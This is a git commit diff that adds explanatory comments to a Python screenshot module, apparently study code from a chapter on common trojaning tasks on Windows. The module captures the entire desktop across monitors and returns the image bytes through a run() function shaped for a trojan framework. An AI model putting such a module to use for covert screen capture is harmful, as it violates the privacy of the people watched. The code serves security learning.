faf22c2c596632a60714b73d86331dfc6da68203
AnLau25 <avald024@uottawa.ca>
2025-06-24 13:04:59 -0400

    coms

--- ch8_CommonTrojaningTasksOnWindows/screenshotter.py
+++ ch8_CommonTrojaningTasksOnWindows/screenshotter.py
@@ -7,35 +7,45 @@ import win32con
 import win32gui
 import win32ui
 
-def get_dimensions():
+
+def get_dimensions(): # Gets screen dimentions
+    
     width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
     height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
     left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
     top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
+    
     return (width, height, left, top)
 
+
 def screenshot(name='screenshot'):
-    hdesktop = win32gui.GetDesktopWindow()
+    
+    hdesktop = win32gui.GetDesktopWindow() # Get handle to the entire Desktop
+    # Includes the entire viewable area across monitors ᕕ( ᐛ )ᕗ
     width, height, left, top = get_dimensions()
     
-    desktop_dc = win32gui.GetWindowDC(hdesktop)
+    desktop_dc = win32gui.GetWindowDC(hdesktop) # Create 𝘥𝘦𝘷𝘪𝘤𝘦 𝘤𝘰𝘯𝘵𝘦𝘯𝘹𝘵
     img_dc = win32ui.CreateDCFromHandle(desktop_dc)
-    mem_dc = img_dc.CreateCompatibleDC()
+    mem_dc = img_dc.CreateCompatibleDC() # 𝘔𝘦𝘮 𝘣𝘢𝘴𝘦𝘥 device context
+    # Will store the bitmap until it is writen to a file
 
-    screenshot = win32ui.CreateBitmap()
+    screenshot = win32ui.CreateBitmap() # Create bitmap obj
     screenshot.CreateCompatibleBitmap(img_dc, width, height)
-    mem_dc.SelectObject(screenshot)
+    mem_dc.SelectObject(screenshot) # Sets the mem_dc to point at the bitmap
     mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
-    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')
+    # Creates a 𝘣𝘪𝘵-𝘧𝘰𝘳-𝘣𝘪𝘵 𝘤𝘰𝘱𝘺 of the desktop img and stores it in the mem_dc
+    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp') # Dump img to disk
     
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
+
 
 def run():
     screenshot()
     with open('screenshot.bmp', 'rb') as f:
         img = f.read()
     return img
+
 
 if __name__ == '__main__':
     screenshot()
